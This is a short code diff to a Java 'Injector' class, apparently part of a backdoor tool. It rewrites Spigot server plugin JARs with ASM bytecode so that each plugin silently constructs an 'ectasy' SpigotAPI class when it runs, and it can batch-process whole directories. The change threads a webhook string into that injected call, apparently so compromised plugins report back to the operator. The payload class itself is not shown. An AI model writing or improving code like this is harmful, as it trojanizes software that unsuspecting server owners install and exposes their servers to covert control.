@@ -9,7 +9,7 @@ import java.util.Objects;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class Injector {
-    public static void inject(String input, String output){
+    public static void inject(String input, String output, String webhook){
         JarLoader plugin = new JarLoader(input, output);
         JarLoader current = new JarLoader(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath(), "");
 
@@ -27,7 +27,8 @@ public class Injector {
                         list.add(new TypeInsnNode(Opcodes.NEW, "fr/bodyalhoha/ectasy/SpigotAPI"));
                         list.add(new InsnNode(Opcodes.DUP));
                         list.add(new VarInsnNode(Opcodes.ALOAD, 0));
-                        list.add(new MethodInsnNode(Opcodes.INVOKESPECIAL, "fr/bodyalhoha/ectasy/SpigotAPI", "<init>", "(Lorg/bukkit/plugin/java/JavaPlugin;)V", false));
+                        list.add(new LdcInsnNode(webhook));
+                        list.add(new MethodInsnNode(Opcodes.INVOKESPECIAL, "fr/bodyalhoha/ectasy/SpigotAPI", "<init>", "(Lorg/bukkit/plugin/java/JavaPlugin;Ljava/lang/String;)V", false));
                         list.add(new InsnNode(Opcodes.POP));
 
                         mn.instructions.insertBefore(mn.instructions.getFirst(), list);
@@ -52,12 +53,12 @@ public class Injector {
         }
     }
 
-    public static void injectDirectory(File directory){
-        File output = new File("output");
+    public static void injectDirectory(File directory, String out, String webhook){
+        File output = new File(out);
         if(!output.exists())
             output.mkdir();
         for(String pl : Objects.requireNonNull(directory.list())){
-            inject(directory.getPath() + "/" + pl, "output/" + pl);
+            inject(directory.getPath() + "/" + pl, out + "/" + pl, webhook);
         }
     }
 
